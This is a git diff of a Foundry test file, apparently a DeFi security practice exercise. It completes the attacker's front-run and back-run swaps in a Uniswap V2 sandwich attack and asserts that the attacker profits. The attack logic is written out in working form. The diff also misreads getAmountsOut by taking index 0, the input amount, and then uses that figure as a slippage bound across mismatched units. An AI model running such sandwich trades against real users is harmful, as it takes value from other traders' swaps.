@@ -3,6 +3,7 @@ pragma solidity 0.8.17;
 
 import "forge-std/Test.sol";
 import { SandwichSetUp } from "./helper/SandwichSetUp.sol";
+import "forge-std/console.sol";
 
 contract SandwichPracticeTest is SandwichSetUp {
     address public maker = makeAddr("Maker");
@@ -83,17 +84,44 @@ contract SandwichPracticeTest is SandwichSetUp {
     function _attackerAction1() internal {
         // victim swap ETH to USDC (front-run victim)
         // implement here
+        address[] memory path = new address[](2);
+        path[0] = address(weth);
+        path[1] = address(usdc);
+
+        vm.prank(attacker);
+        uniswapV2Router.swapExactETHForTokens{ value: 1 ether }(
+            93780012,
+            path,
+            attacker,
+            block.timestamp
+        );
     }
 
     // # Practice 2: attacker sandwich attack
     function _attackerAction2() internal {
         // victim swap USDC to ETH
         // implement here
+        address[] memory path = new address[](2);
+        path[0] = address(usdc);
+        path[1] = address(weth);
+        uint256 usdcBalance = usdc.balanceOf(attacker);
+        vm.startPrank(attacker);
+        usdc.approve(address(uniswapV2Router), usdcBalance);
+        uint256 amountOut = uniswapV2Router.getAmountsOut(usdcBalance, path)[0];
+        uniswapV2Router.swapExactTokensForETH(
+            amountOut,
+            amountOut*99/100,
+            path,
+            attacker,
+            block.timestamp
+        );
+        vm.stopPrank();
     }
 
     // # Discussion 2: how to maximize profit ?
     function _checkAttackerProfit() internal {
         uint256 profit = attacker.balance - attackerInitialEthBalance;
+        console.log(profit);
         assertGt(profit, 0);
     }
 }
